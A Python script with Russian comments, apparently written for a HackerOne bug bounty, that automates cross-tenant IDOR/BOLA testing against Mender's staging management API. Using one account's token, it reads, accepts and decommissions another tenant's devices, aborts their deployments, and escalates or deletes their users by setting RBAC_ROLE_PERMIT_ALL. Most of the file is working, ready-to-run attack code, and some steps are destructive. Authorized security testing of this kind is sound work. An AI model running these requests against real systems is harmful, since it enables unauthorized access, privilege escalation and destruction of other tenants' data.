#!/usr/bin/env python3
"""
IDOR/BOLA Testing Script for Northern.tech
Автоматизирует проверку межтенантного доступа
"""

import requests
import json
import sys
from typing import Dict, List, Tuple

class MenderIDORTester:
    def __init__(self, base_url: str, h1_username: str):
        self.base_url = base_url.rstrip('/')
        self.h1_username = h1_username
        self.headers_base = {
            'X-HackerOne-Research': h1_username,
            'Content-Type': 'application/json'
        }
        
    def set_token(self, token: str, label: str = ""):
        """Установить токен для текущей сессии"""
        self.current_token = token
        self.current_label = label
        self.headers = {
            **self.headers_base,
            'Authorization': f'Bearer {token}'
        }
        
    def test_endpoint(self, method: str, path: str, resource_id: str, 
                     data: Dict = None, description: str = "") -> Tuple[bool, Dict]:
        """
        Тестирование одного endpoint на IDOR
        
        Returns:
            (is_vulnerable, response_data)
        """
        url = f"{self.base_url}{path}".replace('{id}', resource_id)
        
        print(f"\n[*] Testing: {method} {url}")
        print(f"    Description: {description}")
        print(f"    Using token: {self.current_label}")
        print(f"    Target resource: {resource_id}")
        
        try:
            if method == 'GET':
                resp = requests.get(url, headers=self.headers, timeout=10)
            elif method == 'POST':
                resp = requests.post(url, headers=self.headers, json=data, timeout=10)
            elif method == 'PUT':
                resp = requests.put(url, headers=self.headers, json=data, timeout=10)
            elif method == 'DELETE':
                resp = requests.delete(url, headers=self.headers, timeout=10)
            elif method == 'PATCH':
                resp = requests.patch(url, headers=self.headers, json=data, timeout=10)
            else:
                print(f"[!] Unsupported method: {method}")
                return False, {}
                
            print(f"    Status: {resp.status_code}")
            
            # Проверка на уязвимость
            if resp.status_code in [200, 201, 204]:
                print(f"    🚨 POTENTIAL IDOR! Status {resp.status_code} - should be 403/404")
                is_vulnerable = True
            elif resp.status_code in [401, 403, 404]:
                print(f"    ✓ Properly blocked with {resp.status_code}")
                is_vulnerable = False
            else:
                print(f"    ? Unexpected status: {resp.status_code}")
                is_vulnerable = False
                
            try:
                response_data = resp.json()
            except:
                response_data = {'body': resp.text[:200]}
                
            return is_vulnerable, {
                'status_code': resp.status_code,
                'headers': dict(resp.headers),
                'body': response_data,
                'vulnerable': is_vulnerable
            }
            
        except requests.exceptions.RequestException as e:
            print(f"    [!] Request failed: {e}")
            return False, {'error': str(e)}
    
    def run_device_tests(self, victim_device_id: str):
        """Тесты на устройства"""
        print("\n" + "="*60)
        print("TESTING DEVICES ENDPOINTS")
        print("="*60)
        
        results = []
        
        # GET device details
        vuln, data = self.test_endpoint(
            'GET',
            '/api/management/v2/devauth/devices/{id}',
            victim_device_id,
            description="View victim device details"
        )
        results.append(('GET device', vuln, data))
        
        # Accept device
        vuln, data = self.test_endpoint(
            'PUT',
            '/api/management/v2/devauth/devices/{id}/status',
            victim_device_id,
            data={'status': 'accepted'},
            description="Accept victim device"
        )
        results.append(('Accept device', vuln, data))
        
        # Decommission device
        vuln, data = self.test_endpoint(
            'DELETE',
            '/api/management/v2/devauth/devices/{id}',
            victim_device_id,
            description="Decommission victim device"
        )
        results.append(('Delete device', vuln, data))
        
        return results
    
    def run_deployment_tests(self, victim_deployment_id: str):
        """Тесты на deployments"""
        print("\n" + "="*60)
        print("TESTING DEPLOYMENTS ENDPOINTS")
        print("="*60)
        
        results = []
        
        # GET deployment details
        vuln, data = self.test_endpoint(
            'GET',
            '/api/management/v1/deployments/deployments/{id}',
            victim_deployment_id,
            description="View victim deployment"
        )
        results.append(('GET deployment', vuln, data))
        
        # Abort deployment
        vuln, data = self.test_endpoint(
            'PUT',
            '/api/management/v1/deployments/deployments/{id}/status',
            victim_deployment_id,
            data={'status': 'aborted'},
            description="Abort victim deployment"
        )
        results.append(('Abort deployment', vuln, data))
        
        return results
    
    def run_user_tests(self, victim_user_id: str):
        """Тесты на пользователей"""
        print("\n" + "="*60)
        print("TESTING USER MANAGEMENT ENDPOINTS")
        print("="*60)
        
        results = []
        
        # GET user details
        vuln, data = self.test_endpoint(
            'GET',
            '/api/management/v1/useradm/users/{id}',
            victim_user_id,
            description="View victim user"
        )
        results.append(('GET user', vuln, data))
        
        # Update user role
        vuln, data = self.test_endpoint(
            'PUT',
            '/api/management/v1/useradm/users/{id}',
            victim_user_id,
            data={'roles': ['RBAC_ROLE_PERMIT_ALL']},
            description="Escalate victim user privileges"
        )
        results.append(('Escalate user', vuln, data))
        
        # Delete user
        vuln, data = self.test_endpoint(
            'DELETE',
            '/api/management/v1/useradm/users/{id}',
            victim_user_id,
            description="Delete victim user"
        )
        results.append(('Delete user', vuln, data))
        
        return results
    
    def generate_report(self, all_results: List):
        """Генерация отчета"""
        print("\n" + "="*60)
        print("IDOR TEST RESULTS SUMMARY")
        print("="*60)
        
        vulnerable_count = 0
        for test_name, is_vuln, data in all_results:
            status = "🚨 VULNERABLE" if is_vuln else "✓ Protected"
            print(f"{status:20} | {test_name}")
            if is_vuln:
                vulnerable_count += 1
                
        print("\n" + "="*60)
        print(f"Total tests: {len(all_results)}")
        print(f"Vulnerable: {vulnerable_count}")
        print(f"Protected: {len(all_results) - vulnerable_count}")
        print("="*60)
        
        if vulnerable_count > 0:
            print("\n⚠️  CRITICAL: Found IDOR vulnerabilities!")
            print("These should be reported to HackerOne immediately.")


def main():
    print("""
    ╔════════════════════════════════════════════════════╗
    ║   Northern.tech IDOR/BOLA Testing Tool            ║
    ║   For authorized bug bounty testing only          ║
    ╚════════════════════════════════════════════════════╝
    """)
    
    # Configuration
    BASE_URL = "https://staging.hosted.mender.io"
    H1_USERNAME = input("Enter your H1 username: ").strip()
    
    print("\n[*] You need TWO accounts for IDOR testing:")
    print("    Account A (Attacker): Token to use for attacks")
    print("    Account B (Victim): Resources to target\n")
    
    token_a = input("Enter Token A (attacker): ").strip()
    token_b = input("Enter Token B (victim - for legitimate access check): ").strip()
    
    print("\n[*] Enter victim resource IDs to test:")
    victim_device_id = input("Victim Device ID: ").strip()
    victim_deployment_id = input("Victim Deployment ID (optional): ").strip()
    victim_user_id = input("Victim User ID (optional): ").strip()
    
    # Initialize tester
    tester = MenderIDORTester(BASE_URL, H1_USERNAME)
    
    all_results = []
    
    # Test with attacker token
    tester.set_token(token_a, "Attacker (Account A)")
    
    if victim_device_id:
        all_results.extend(tester.run_device_tests(victim_device_id))
    
    if victim_deployment_id:
        all_results.extend(tester.run_deployment_tests(victim_deployment_id))
    
    if victim_user_id:
        all_results.extend(tester.run_user_tests(victim_user_id))
    
    # Generate report
    tester.generate_report(all_results)
    
    # Save to file
    report_file = "idor_test_results.json"
    with open(report_file, 'w') as f:
        json.dump([{
            'test': name,
            'vulnerable': vuln,
            'response': data
        } for name, vuln, data in all_results], f, indent=2)
    
    print(f"\n[*] Full results saved to: {report_file}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Testing interrupted by user")
        sys.exit(1)
